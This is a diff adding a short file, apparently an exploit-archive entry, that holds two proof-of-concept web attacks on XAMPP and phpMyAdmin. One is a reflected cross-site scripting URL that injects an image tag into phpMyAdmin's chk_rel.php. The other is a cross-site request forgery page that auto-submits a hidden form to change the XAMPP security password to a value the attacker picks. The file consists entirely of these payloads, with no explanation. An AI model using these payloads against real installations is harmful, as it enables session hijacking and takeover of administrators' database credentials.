@@ -1,0 +1,22 @@
+1. Cross-site scripting:
+
+http://www.example.com/phpmyadmin/chk_rel.php?db=>"'><img src="javascript:alert(311050)">&token=6026d96cfcb8993f744a00809536dc8b&goto=db_operations.php
+
+2. Cross-site request-forgery:
+
+<html>
+    <script>
+    document.getElementById("xampp").submit();
+    </script>
+      <body onload="run_once()">
+        <form id="xampp" action="http://www.example.com/security/xamppsecurity.php" method="POST">
+          <input type="hidden" name="mypasswd" value="test@123" />
+          <input type="hidden" name="mypasswdrepeat" value="test@123" />
+          <input type="hidden" name="authphpmyadmin" value="cookie" />
+          <input type="hidden" name="changing" value="Password changing" />
+          <input type="hidden" name="xamppuser" value="" />
+          <input type="hidden" name="xampppasswd" value="" />
+          <input type="submit" value="Click here" />
+        </form>
+      </body>
+    </html>
